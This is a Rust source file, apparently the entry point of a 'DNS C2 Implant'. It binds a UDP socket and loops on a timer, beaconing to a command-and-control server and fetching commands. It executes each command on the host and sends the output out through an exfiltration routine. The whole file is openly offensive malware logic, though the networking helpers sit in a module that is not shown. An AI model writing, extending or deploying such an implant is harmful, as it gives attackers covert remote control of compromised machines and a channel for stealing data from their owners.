mod client;
use client::*;
use std::net::UdpSocket;
use std::thread;
use std::time::Duration;

fn main() -> std::io::Result<()> {
    println!("DNS C2 Implant");
    println!("Implant ID: {}", IMPLANT_ID);
    println!("C2 Server: {}", C2_SERVER);
    println!("Domain: {}\n", DOMAIN);

    let socket = UdpSocket::bind("0.0.0.0:0")?;
    println!("[+] Bound to local port: {}\n", socket.local_addr()?);

    loop {
        println!("\n--- Beacon Cycle ---");

        match beacon(&socket) {
            Ok(has_commands) => {
                if has_commands {
                    println!("[!] Commands available!");

                    // Fetch and execute command
                    match fetch_command(&socket) {
                        Ok(Some(cmd)) => {
                            println!("[+] Command received: {}", cmd);

                            let output = execute_command(&cmd);
                            println!("[+] Command output:\n{}", output);

                            // Exfiltrate result
                            if let Err(e) = exfiltrate_data(&socket, &output) {
                                println!("[!] Exfil error: {}", e);
                            }
                        }
                        Ok(None) => println!("[*] No commands in queue"),
                        Err(e) => println!("[!] Fetch error: {}", e),
                    }
                } else {
                    println!("[*] No commands pending");
                }
            }
            Err(e) => println!("[!] Beacon error: {}", e),
        }

        println!("\n[*] Sleeping for {} seconds...", BEACON_INTERVAL);
        thread::sleep(Duration::from_secs(BEACON_INTERVAL));
    }
}
